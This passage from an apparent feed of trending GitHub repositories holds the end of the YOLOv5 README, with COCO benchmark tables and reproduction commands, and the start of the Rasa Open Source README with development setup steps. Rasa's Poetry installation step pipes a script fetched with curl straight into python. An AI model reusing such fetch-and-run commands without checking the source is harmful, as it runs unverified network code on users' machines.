&lt;p align=&#34;left&#34;&gt;&lt;img width=&#34;800&#34; src=&#34;https://user-images.githubusercontent.com/26833433/155040757-ce0934a3-06a6-43dc-a979-2edbbd69ea0e.png&#34;&gt;&lt;/p&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Figure Notes (click to expand)&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt;&lt;strong&gt;COCO AP val&lt;/strong&gt; denotes mAP@0.5:0.95 metric measured on the 5000-image &lt;a href=&#34;http://cocodataset.org&#34;&gt;COCO val2017&lt;/a&gt; dataset over various inference sizes from 256 to 1536.&lt;/li&gt; &#xA;  &lt;li&gt;&lt;strong&gt;GPU Speed&lt;/strong&gt; measures average inference time per image on &lt;a href=&#34;http://cocodataset.org&#34;&gt;COCO val2017&lt;/a&gt; dataset using a &lt;a href=&#34;https://aws.amazon.com/ec2/instance-types/p3/&#34;&gt;AWS p3.2xlarge&lt;/a&gt; V100 instance at batch-size 32.&lt;/li&gt; &#xA;  &lt;li&gt;&lt;strong&gt;EfficientDet&lt;/strong&gt; data from &lt;a href=&#34;https://github.com/google/automl&#34;&gt;google/automl&lt;/a&gt; at batch size 8.&lt;/li&gt; &#xA;  &lt;li&gt;&lt;strong&gt;Reproduce&lt;/strong&gt; by &lt;code&gt;python val.py --task study --data coco.yaml --iou 0.7 --weights yolov5n6.pt yolov5s6.pt yolov5m6.pt yolov5l6.pt yolov5x6.pt&lt;/code&gt;&lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;h3&gt;Pretrained Checkpoints&lt;/h3&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th&gt;Model&lt;/th&gt; &#xA;   &lt;th&gt;size&lt;br&gt;&lt;sup&gt;(pixels)&lt;/sup&gt;&lt;/th&gt; &#xA;   &lt;th&gt;mAP&lt;sup&gt;val&lt;br&gt;0.5:0.95&lt;/sup&gt;&lt;/th&gt; &#xA;   &lt;th&gt;mAP&lt;sup&gt;val&lt;br&gt;0.5&lt;/sup&gt;&lt;/th&gt; &#xA;   &lt;th&gt;Speed&lt;br&gt;&lt;sup&gt;CPU b1&lt;br&gt;(ms)&lt;/sup&gt;&lt;/th&gt; &#xA;   &lt;th&gt;Speed&lt;br&gt;&lt;sup&gt;V100 b1&lt;br&gt;(ms)&lt;/sup&gt;&lt;/th&gt; &#xA;   &lt;th&gt;Speed&lt;br&gt;&lt;sup&gt;V100 b32&lt;br&gt;(ms)&lt;/sup&gt;&lt;/th&gt; &#xA;   &lt;th&gt;params&lt;br&gt;&lt;sup&gt;(M)&lt;/sup&gt;&lt;/th&gt; &#xA;   &lt;th&gt;FLOPs&lt;br&gt;&lt;sup&gt;@640 (B)&lt;/sup&gt;&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://github.com/ultralytics/yolov5/releases&#34;&gt;YOLOv5n&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;640&lt;/td&gt; &#xA;   &lt;td&gt;28.0&lt;/td&gt; &#xA;   &lt;td&gt;45.7&lt;/td&gt; &#xA;   &lt;td&gt;&lt;strong&gt;45&lt;/strong&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;strong&gt;6.3&lt;/strong&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;strong&gt;0.6&lt;/strong&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;strong&gt;1.9&lt;/strong&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;strong&gt;4.5&lt;/strong&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://github.com/ultralytics/yolov5/releases&#34;&gt;YOLOv5s&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;640&lt;/td&gt; &#xA;   &lt;td&gt;37.4&lt;/td&gt; &#xA;   &lt;td&gt;56.8&lt;/td&gt; &#xA;   &lt;td&gt;98&lt;/td&gt; &#xA;   &lt;td&gt;6.4&lt;/td&gt; &#xA;   &lt;td&gt;0.9&lt;/td&gt; &#xA;   &lt;td&gt;7.2&lt;/td&gt; &#xA;   &lt;td&gt;16.5&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://github.com/ultralytics/yolov5/releases&#34;&gt;YOLOv5m&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;640&lt;/td&gt; &#xA;   &lt;td&gt;45.4&lt;/td&gt; &#xA;   &lt;td&gt;64.1&lt;/td&gt; &#xA;   &lt;td&gt;224&lt;/td&gt; &#xA;   &lt;td&gt;8.2&lt;/td&gt; &#xA;   &lt;td&gt;1.7&lt;/td&gt; &#xA;   &lt;td&gt;21.2&lt;/td&gt; &#xA;   &lt;td&gt;49.0&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://github.com/ultralytics/yolov5/releases&#34;&gt;YOLOv5l&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;640&lt;/td&gt; &#xA;   &lt;td&gt;49.0&lt;/td&gt; &#xA;   &lt;td&gt;67.3&lt;/td&gt; &#xA;   &lt;td&gt;430&lt;/td&gt; &#xA;   &lt;td&gt;10.1&lt;/td&gt; &#xA;   &lt;td&gt;2.7&lt;/td&gt; &#xA;   &lt;td&gt;46.5&lt;/td&gt; &#xA;   &lt;td&gt;109.1&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://github.com/ultralytics/yolov5/releases&#34;&gt;YOLOv5x&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;640&lt;/td&gt; &#xA;   &lt;td&gt;50.7&lt;/td&gt; &#xA;   &lt;td&gt;68.9&lt;/td&gt; &#xA;   &lt;td&gt;766&lt;/td&gt; &#xA;   &lt;td&gt;12.1&lt;/td&gt; &#xA;   &lt;td&gt;4.8&lt;/td&gt; &#xA;   &lt;td&gt;86.7&lt;/td&gt; &#xA;   &lt;td&gt;205.7&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://github.com/ultralytics/yolov5/releases&#34;&gt;YOLOv5n6&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;1280&lt;/td&gt; &#xA;   &lt;td&gt;36.0&lt;/td&gt; &#xA;   &lt;td&gt;54.4&lt;/td&gt; &#xA;   &lt;td&gt;153&lt;/td&gt; &#xA;   &lt;td&gt;8.1&lt;/td&gt; &#xA;   &lt;td&gt;2.1&lt;/td&gt; &#xA;   &lt;td&gt;3.2&lt;/td&gt; &#xA;   &lt;td&gt;4.6&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://github.com/ultralytics/yolov5/releases&#34;&gt;YOLOv5s6&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;1280&lt;/td&gt; &#xA;   &lt;td&gt;44.8&lt;/td&gt; &#xA;   &lt;td&gt;63.7&lt;/td&gt; &#xA;   &lt;td&gt;385&lt;/td&gt; &#xA;   &lt;td&gt;8.2&lt;/td&gt; &#xA;   &lt;td&gt;3.6&lt;/td&gt; &#xA;   &lt;td&gt;12.6&lt;/td&gt; &#xA;   &lt;td&gt;16.8&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://github.com/ultralytics/yolov5/releases&#34;&gt;YOLOv5m6&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;1280&lt;/td&gt; &#xA;   &lt;td&gt;51.3&lt;/td&gt; &#xA;   &lt;td&gt;69.3&lt;/td&gt; &#xA;   &lt;td&gt;887&lt;/td&gt; &#xA;   &lt;td&gt;11.1&lt;/td&gt; &#xA;   &lt;td&gt;6.8&lt;/td&gt; &#xA;   &lt;td&gt;35.7&lt;/td&gt; &#xA;   &lt;td&gt;50.0&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://github.com/ultralytics/yolov5/releases&#34;&gt;YOLOv5l6&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;1280&lt;/td&gt; &#xA;   &lt;td&gt;53.7&lt;/td&gt; &#xA;   &lt;td&gt;71.3&lt;/td&gt; &#xA;   &lt;td&gt;1784&lt;/td&gt; &#xA;   &lt;td&gt;15.8&lt;/td&gt; &#xA;   &lt;td&gt;10.5&lt;/td&gt; &#xA;   &lt;td&gt;76.8&lt;/td&gt; &#xA;   &lt;td&gt;111.4&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://github.com/ultralytics/yolov5/releases&#34;&gt;YOLOv5x6&lt;/a&gt;&lt;br&gt;+ &lt;a href=&#34;https://github.com/ultralytics/yolov5/issues/303&#34;&gt;TTA&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;1280&lt;br&gt;1536&lt;/td&gt; &#xA;   &lt;td&gt;55.0&lt;br&gt;&lt;strong&gt;55.8&lt;/strong&gt;&lt;/td&gt; &#xA;   &lt;td&gt;72.7&lt;br&gt;&lt;strong&gt;72.7&lt;/strong&gt;&lt;/td&gt; &#xA;   &lt;td&gt;3136&lt;br&gt;-&lt;/td&gt; &#xA;   &lt;td&gt;26.2&lt;br&gt;-&lt;/td&gt; &#xA;   &lt;td&gt;19.4&lt;br&gt;-&lt;/td&gt; &#xA;   &lt;td&gt;140.7&lt;br&gt;-&lt;/td&gt; &#xA;   &lt;td&gt;209.8&lt;br&gt;-&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Table Notes (click to expand)&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt;All checkpoints are trained to 300 epochs with default settings. Nano and Small models use &lt;a href=&#34;https://github.com/ultralytics/yolov5/raw/master/data/hyps/hyp.scratch-low.yaml&#34;&gt;hyp.scratch-low.yaml&lt;/a&gt; hyps, all others use &lt;a href=&#34;https://github.com/ultralytics/yolov5/raw/master/data/hyps/hyp.scratch-high.yaml&#34;&gt;hyp.scratch-high.yaml&lt;/a&gt;.&lt;/li&gt; &#xA;  &lt;li&gt;&lt;strong&gt;mAP&lt;sup&gt;val&lt;/sup&gt;&lt;/strong&gt; values are for single-model single-scale on &lt;a href=&#34;http://cocodataset.org&#34;&gt;COCO val2017&lt;/a&gt; dataset.&lt;br&gt;Reproduce by &lt;code&gt;python val.py --data coco.yaml --img 640 --conf 0.001 --iou 0.65&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;strong&gt;Speed&lt;/strong&gt; averaged over COCO val images using a &lt;a href=&#34;https://aws.amazon.com/ec2/instance-types/p3/&#34;&gt;AWS p3.2xlarge&lt;/a&gt; instance. NMS times (~1 ms/img) not included.&lt;br&gt;Reproduce by &lt;code&gt;python val.py --data coco.yaml --img 640 --task speed --batch 1&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;strong&gt;TTA&lt;/strong&gt; &lt;a href=&#34;https://github.com/ultralytics/yolov5/issues/303&#34;&gt;Test Time Augmentation&lt;/a&gt; includes reflection and scale augmentations.&lt;br&gt;Reproduce by &lt;code&gt;python val.py --data coco.yaml --img 1536 --iou 0.7 --augment&lt;/code&gt;&lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;h2&gt;&#xA; &lt;div align=&#34;center&#34;&gt;&#xA;  Contribute&#xA; &lt;/div&gt;&lt;/h2&gt; &#xA;&lt;p&gt;We love your input! We want to make contributing to YOLOv5 as easy and transparent as possible. Please see our &lt;a href=&#34;https://raw.githubusercontent.com/ultralytics/yolov5/master/CONTRIBUTING.md&#34;&gt;Contributing Guide&lt;/a&gt; to get started, and fill out the &lt;a href=&#34;https://ultralytics.com/survey?utm_source=github&amp;amp;utm_medium=social&amp;amp;utm_campaign=Survey&#34;&gt;YOLOv5 Survey&lt;/a&gt; to send us feedback on your experiences. Thank you to all our contributors!&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/ultralytics/yolov5/graphs/contributors&#34;&gt;&lt;img src=&#34;https://opencollective.com/ultralytics/contributors.svg?width=990&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;&#xA; &lt;div align=&#34;center&#34;&gt;&#xA;  Contact&#xA; &lt;/div&gt;&lt;/h2&gt; &#xA;&lt;p&gt;For YOLOv5 bugs and feature requests please visit &lt;a href=&#34;https://github.com/ultralytics/yolov5/issues&#34;&gt;GitHub Issues&lt;/a&gt;. For business inquiries or professional support requests please visit &lt;a href=&#34;https://ultralytics.com/contact&#34;&gt;https://ultralytics.com/contact&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;br&gt; &#xA;&lt;div align=&#34;center&#34;&gt; &#xA; &lt;a href=&#34;https://github.com/ultralytics&#34;&gt; &lt;img src=&#34;https://github.com/ultralytics/yolov5/releases/download/v1.0/logo-social-github.png&#34; width=&#34;3%&#34;&gt; &lt;/a&gt; &#xA; &lt;img width=&#34;3%&#34;&gt; &#xA; &lt;a href=&#34;https://www.linkedin.com/company/ultralytics&#34;&gt; &lt;img src=&#34;https://github.com/ultralytics/yolov5/releases/download/v1.0/logo-social-linkedin.png&#34; width=&#34;3%&#34;&gt; &lt;/a&gt; &#xA; &lt;img width=&#34;3%&#34;&gt; &#xA; &lt;a href=&#34;https://twitter.com/ultralytics&#34;&gt; &lt;img src=&#34;https://github.com/ultralytics/yolov5/releases/download/v1.0/logo-social-twitter.png&#34; width=&#34;3%&#34;&gt; &lt;/a&gt; &#xA; &lt;img width=&#34;3%&#34;&gt; &#xA; &lt;a href=&#34;https://www.producthunt.com/@glenn_jocher&#34;&gt; &lt;img src=&#34;https://github.com/ultralytics/yolov5/releases/download/v1.0/logo-social-producthunt.png&#34; width=&#34;3%&#34;&gt; &lt;/a&gt; &#xA; &lt;img width=&#34;3%&#34;&gt; &#xA; &lt;a href=&#34;https://youtube.com/ultralytics&#34;&gt; &lt;img src=&#34;https://github.com/ultralytics/yolov5/releases/download/v1.0/logo-social-youtube.png&#34; width=&#34;3%&#34;&gt; &lt;/a&gt; &#xA; &lt;img width=&#34;3%&#34;&gt; &#xA; &lt;a href=&#34;https://www.facebook.com/ultralytics&#34;&gt; &lt;img src=&#34;https://github.com/ultralytics/yolov5/releases/download/v1.0/logo-social-facebook.png&#34; width=&#34;3%&#34;&gt; &lt;/a&gt; &#xA; &lt;img width=&#34;3%&#34;&gt; &#xA; &lt;a href=&#34;https://www.instagram.com/ultralytics/&#34;&gt; &lt;img src=&#34;https://github.com/ultralytics/yolov5/releases/download/v1.0/logo-social-instagram.png&#34; width=&#34;3%&#34;&gt; &lt;/a&gt; &#xA;&lt;/div&gt;</summary>
  </entry>
  <entry>
    <title>RasaHQ/rasa</title>
    <updated>2022-05-29T01:33:11Z</updated>
    <id>tag:github.com,2022-05-29:/RasaHQ/rasa</id>
    <link href="https://github.com/RasaHQ/rasa" rel="alternate"></link>
    <summary type="html">&lt;p&gt;💬 Open source machine learning framework to automate text- and voice-based conversations: NLU, dialogue management, connect to Slack, Facebook, and more - Create chatbots and voice assistants&lt;/p&gt;&lt;hr&gt;&lt;h1 align=&#34;center&#34;&gt;Rasa Open Source&lt;/h1&gt; &#xA;&lt;div align=&#34;center&#34;&gt; &#xA; &lt;p&gt;&lt;a href=&#34;https://forum.rasa.com/?utm_source=badge&amp;amp;utm_medium=badge&amp;amp;utm_campaign=pr-badge&amp;amp;utm_content=badge&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/forum-join%20discussions-brightgreen.svg?sanitize=true&#34; alt=&#34;Join the chat on Rasa Community Forum&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://badge.fury.io/py/rasa&#34;&gt;&lt;img src=&#34;https://badge.fury.io/py/rasa.svg?sanitize=true&#34; alt=&#34;PyPI version&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://pypi.python.org/pypi/rasa&#34;&gt;&lt;img src=&#34;https://img.shields.io/pypi/pyversions/rasa.svg?sanitize=true&#34; alt=&#34;Supported Python Versions&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/RasaHQ/rasa/actions&#34;&gt;&lt;img src=&#34;https://github.com/RasaHQ/rasa/workflows/Continuous%20Integration/badge.svg?sanitize=true&#34; alt=&#34;Build Status&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://coveralls.io/github/RasaHQ/rasa?branch=main&#34;&gt;&lt;img src=&#34;https://coveralls.io/repos/github/RasaHQ/rasa/badge.svg?branch=main&#34; alt=&#34;Coverage Status&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://rasa.com/docs&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/docs-stable-brightgreen.svg?sanitize=true&#34; alt=&#34;Documentation Status&#34;&gt;&lt;/a&gt; &lt;img src=&#34;https://img.shields.io/netlify/d2e447e4-5a5e-4dc7-be5d-7c04ae7ff706?label=Documentation%20Build&#34; alt=&#34;Documentation Build&#34;&gt; &lt;a href=&#34;https://app.fossa.com/projects/custom%2B8141%2Fgit%40github.com%3ARasaHQ%2Frasa.git?ref=badge_shield&#34;&gt;&lt;img src=&#34;https://app.fossa.com/api/projects/custom%2B8141%2Fgit%40github.com%3ARasaHQ%2Frasa.git.svg?type=shield&#34; alt=&#34;FOSSA Status&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/orgs/RasaHQ/projects/23&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/PRs-welcome-brightgreen.svg?style=flat-square&#34; alt=&#34;PRs Welcome&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;/div&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://grnh.se/05a908c02us&#34; target=&#34;_blank&#34;&gt;&lt;img align=&#34;center&#34; src=&#34;https://www.rasa.com/assets/img/github/hiring_banner.png&#34; alt=&#34;An image with Sara, the Rasa mascot, standing next to a roadmap with future Rasa milestones: identifying unsuccessful conversations at scale, continuous model evaluation, controllable NLG and breaking free from intents. Are you excited about these milestones? Help us make these ideas become reality - we&#39;re hiring!&#34; title=&#34;We&#39;re hiring! Learn more&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;hr&gt; &#xA;&lt;p&gt;💡 &lt;strong&gt;Rasa Open Source 3.0 is here!&lt;/strong&gt; 💡&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/RasaHQ/rasa/milestone/39&#34;&gt;2.8&lt;/a&gt; is the last minor in the 2.x series. You can still contribute new features and improvements which we plan to release alongside updates to 3.0. Read more about &lt;a href=&#34;https://raw.githubusercontent.com/RasaHQ/rasa/main/#how-to-contribute&#34;&gt;our contributor guidelines&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;hr&gt; &#xA;&lt;img align=&#34;right&#34; height=&#34;244&#34; src=&#34;https://www.rasa.com/assets/img/sara/sara-open-source-2.0.png&#34; alt=&#34;An image of Sara, the Rasa mascot bird, holding a flag that reads Open Source with one wing, and a wrench in the other&#34; title=&#34;Rasa Open Source&#34;&gt; &#xA;&lt;p&gt;Rasa is an open source machine learning framework to automate text-and voice-based conversations. With Rasa, you can build contextual assistants on:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Facebook Messenger&lt;/li&gt; &#xA; &lt;li&gt;Slack&lt;/li&gt; &#xA; &lt;li&gt;Google Hangouts&lt;/li&gt; &#xA; &lt;li&gt;Webex Teams&lt;/li&gt; &#xA; &lt;li&gt;Microsoft Bot Framework&lt;/li&gt; &#xA; &lt;li&gt;Rocket.Chat&lt;/li&gt; &#xA; &lt;li&gt;Mattermost&lt;/li&gt; &#xA; &lt;li&gt;Telegram&lt;/li&gt; &#xA; &lt;li&gt;Twilio&lt;/li&gt; &#xA; &lt;li&gt;Your own custom conversational channels&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;or voice assistants as:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Alexa Skills&lt;/li&gt; &#xA; &lt;li&gt;Google Home Actions&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;Rasa helps you build contextual assistants capable of having layered conversations with lots of back-and-forth. In order for a human to have a meaningful exchange with a contextual assistant, the assistant needs to be able to use context to build on things that were previously discussed – Rasa enables you to build assistants that can do this in a scalable way.&lt;/p&gt; &#xA;&lt;p&gt;There&#39;s a lot more background information in this &lt;a href=&#34;https://medium.com/rasa-blog/a-new-approach-to-conversational-software-2e64a5d05f2a&#34;&gt;blog post&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;hr&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;strong&gt;What does Rasa do? 🤔&lt;/strong&gt; &lt;a href=&#34;https://rasa.com/&#34;&gt;Check out our Website&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;strong&gt;I&#39;m new to Rasa 😄&lt;/strong&gt; &lt;a href=&#34;https://rasa.com/docs/getting-started/&#34;&gt;Get Started with Rasa&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;strong&gt;I&#39;d like to read the detailed docs 🤓&lt;/strong&gt; &lt;a href=&#34;https://rasa.com/docs/&#34;&gt;Read The Docs&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;strong&gt;I&#39;m ready to install Rasa 🚀&lt;/strong&gt; &lt;a href=&#34;https://rasa.com/docs/rasa/user-guide/installation/&#34;&gt;Installation&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;strong&gt;I want to learn how to use Rasa 🚀&lt;/strong&gt; &lt;a href=&#34;https://rasa.com/docs/rasa/user-guide/rasa-tutorial/&#34;&gt;Tutorial&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;strong&gt;I have a question ❓&lt;/strong&gt; &lt;a href=&#34;https://forum.rasa.com/&#34;&gt;Rasa Community Forum&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;strong&gt;I would like to contribute 🤗&lt;/strong&gt; &lt;a href=&#34;https://raw.githubusercontent.com/RasaHQ/rasa/main/#how-to-contribute&#34;&gt;How to Contribute&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;hr&gt; &#xA;&lt;h2&gt;Where to get help&lt;/h2&gt; &#xA;&lt;p&gt;There is extensive documentation in the &lt;a href=&#34;https://rasa.com/docs/rasa&#34;&gt;Rasa Docs&lt;/a&gt;. Make sure to select the correct version so you are looking at the docs for the version you installed.&lt;/p&gt; &#xA;&lt;p&gt;Please use &lt;a href=&#34;https://forum.rasa.com&#34;&gt;Rasa Community Forum&lt;/a&gt; for quick answers to questions.&lt;/p&gt; &#xA;&lt;h3&gt;README Contents:&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/RasaHQ/rasa/main/#how-to-contribute&#34;&gt;How to contribute&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/RasaHQ/rasa/main/#development-internals&#34;&gt;Development Internals&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/RasaHQ/rasa/main/#releases&#34;&gt;Releases&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/RasaHQ/rasa/main/#license&#34;&gt;License&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;How to contribute&lt;/h3&gt; &#xA;&lt;p&gt;We are very happy to receive and merge your contributions into this repository!&lt;/p&gt; &#xA;&lt;p&gt;To contribute via pull request, follow these steps:&lt;/p&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;Create an issue describing the feature you want to work on (or have a look at the &lt;a href=&#34;https://github.com/orgs/RasaHQ/projects/23&#34;&gt;contributor board&lt;/a&gt;)&lt;/li&gt; &#xA; &lt;li&gt;Write your code, tests and documentation, and format them with &lt;code&gt;black&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;Create a pull request describing your changes&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;p&gt;For more detailed instructions on how to contribute code, check out these &lt;a href=&#34;https://raw.githubusercontent.com/RasaHQ/rasa/main/CONTRIBUTING.md&#34;&gt;code contributor guidelines&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;You can find more information about how to contribute to Rasa (in lots of different ways!) &lt;a href=&#34;http://rasa.com/community/contribute&#34;&gt;on our website.&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;Your pull request will be reviewed by a maintainer, who will get back to you about any necessary changes or questions. You will also be asked to sign a &lt;a href=&#34;https://cla-assistant.io/RasaHQ/rasa&#34;&gt;Contributor License Agreement&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Development Internals&lt;/h2&gt; &#xA;&lt;h3&gt;Installing Poetry&lt;/h3&gt; &#xA;&lt;p&gt;Rasa uses Poetry for packaging and dependency management. If you want to build it from source, you have to install Poetry first. This is how it can be done:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;curl -sSL https://raw.githubusercontent.com/python-poetry/poetry/master/get-poetry.py | python&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;There are several other ways to install Poetry. Please, follow &lt;a href=&#34;https://python-poetry.org/docs/#installation&#34;&gt;the official guide&lt;/a&gt; to see all possible options.&lt;/p&gt; &#xA;&lt;h3&gt;Managing environments&lt;/h3&gt; &#xA;&lt;p&gt;The official &lt;a href=&#34;https://python-poetry.org/docs/managing-environments/&#34;&gt;Poetry guide&lt;/a&gt; suggests to use &lt;a href=&#34;https://github.com/pyenv/pyenv&#34;&gt;pyenv&lt;/a&gt; or any other similar tool to easily switch between Python versions. This is how it can be done:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;pyenv install 3.7.9&#xA;pyenv local 3.7.9  # Activate Python 3.7.9 for the current project&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;em&gt;Note&lt;/em&gt;: If you have trouble installing a specific version of python on your system it might be worth trying other supported versions.&lt;/p&gt; &#xA;&lt;p&gt;By default, Poetry will try to use the currently activated Python version to create the virtual environment for the current project automatically. You can also create and activate a virtual environment manually — in this case, Poetry should pick it up and use it to install the dependencies. For example:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;python -m venv .venv&#xA;source .venv/bin/activate&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;You can make sure that the environment is picked up by executing&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;poetry env info&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Building from source&lt;/h3&gt; &#xA;&lt;p&gt;To install dependencies and &lt;code&gt;rasa&lt;/code&gt; itself in editable mode execute&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;make install&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;em&gt;Note for macOS users&lt;/em&gt;: under macOS Big Sur we&#39;ve seen some compiler issues for dependencies. Using &lt;code&gt;export SYSTEM_VERSION_COMPAT=1&lt;/code&gt; before the installation helped.&lt;/p&gt; &#xA;&lt;h3&gt;Running and changing the documentation&lt;/h3&gt; &#xA;&lt;p&gt;First of all, install all the required dependencies:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;make install install-docs&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;After the installation has finished, you can run and view the documentation locally using:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;make livedocs&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;It should open a new tab with the local version of the docs in your browser; if not, visit &lt;a href=&#34;http://localhost:3000&#34;&gt;http://localhost:3000&lt;/a&gt; in your browser. You can now change the docs locally and the web page will automatically 